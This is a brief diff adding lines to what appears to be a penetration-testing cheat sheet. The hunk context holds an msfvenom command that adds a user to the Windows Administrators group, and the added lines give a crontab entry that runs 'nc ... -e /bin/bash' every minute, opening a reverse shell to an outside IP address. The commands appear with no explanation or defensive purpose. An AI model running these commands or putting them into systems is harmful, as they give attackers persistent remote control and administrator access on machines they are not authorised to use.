@@ -85,6 +85,12 @@ msfvenom -p windows/exec CMD='cmd.exe /C "net localgroup Administrators comrade 
 
 
 
+`crontab -e`
+  - `* * * * * nc 192.168.28.135 33403 -e /bin/bash`
+
+
+
+
 
 
 
